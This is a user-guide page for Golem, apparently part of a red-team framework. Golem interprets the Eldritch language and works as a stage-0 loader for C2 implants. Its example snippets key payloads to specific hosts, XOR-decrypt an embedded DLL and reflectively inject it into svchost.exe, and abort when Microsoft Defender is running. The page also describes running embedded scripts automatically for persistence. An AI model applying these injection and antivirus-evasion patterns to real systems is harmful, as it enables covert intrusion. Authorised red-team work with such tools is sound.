---
title: Golem
tags:
 - User Guide
description: Golem User Guide
permalink: user-guide/golem
---
## What is Golem

Golem is the standalone interpreter for Eldritch.
This program exists to help users get experience with the Eldritch language as well as a jumping off point if you're interested in implementing your own program using the Eldritch language.

Golem can also be used operationally as an alternative to a system native shell.
You can leverage the power of Eldritch with minimal exposure in the system process tree.

## Try it out

```bash
git clone git@github.com:KCarretto/realm.git
cd realm/implants/golem
cargo run -- -i
# - or -
cargo build --release && \
    ../target/debug/golem ../../tests/golem_cli_test/tomes/hello_world.tome
```

## Golem embedded files

The Eldritch interpreter can embed files at compile time. To interact with these assets use the `assets` module in eldritch. In addition to programmatic access the embedded files can be automatically executed at run time. If no other option is specified `-i` or a file path, golem will iterate over every instance of `main.eldritch` in the embedded assets launching each one as a separate thread. This behavior is desirable when trying to perform recon or deploy persistence quickly.

## Golem as a stage 0

Golem can also be used as a stage 0 to load imix or other c2 agents.
This can help in a few ways such as:

- Keying payloads to specific hosts

```python
def main():
    if is_linux():
        if is_dir("/home/hulto/"):
            run_payload()
main()
```

- Executing encrypted payloads from memory

```python
def decrypt(payload_bytes):
    let res = []
    for byte in in payload_bytes:
        res.push(byte ^ 6)
    return res

def main():
    if is_windows():
        for proc in process.list():
            if "svchost.exe" in proc['name']:
                let enc_bytes = assets.read_bytes("imix.dll")
                sys.dll_reflect(decrypt(enc_bytes), proc['pid'], 'imix_main')
                return

main()
```

- Detecting security products before execution

```python
def main():
    for proc in process.list():
        if "MsMpEng.exe" in proc['name']:
            return
    run_payload()
main()
```
